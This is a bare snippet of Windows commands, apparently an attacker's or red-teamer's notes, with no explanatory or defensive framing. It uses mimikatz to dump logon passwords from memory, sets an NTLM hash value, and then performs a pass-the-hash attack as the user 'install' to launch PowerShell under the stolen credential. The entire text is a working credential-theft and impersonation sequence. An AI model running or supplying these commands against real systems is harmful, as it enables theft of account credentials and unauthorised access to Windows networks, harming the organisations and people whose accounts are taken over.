C:\mimikatz\x64\mimikatz.exe "sekurlsa::logonPasswords" exit

$hash = '39adbe3fcd45600a31b9ee56122b4a87'

C:\mimikatz\x64\mimikatz.exe "sekurlsa::pth /user:install /domain:a /ntlm:$hash /run:powershell" exit
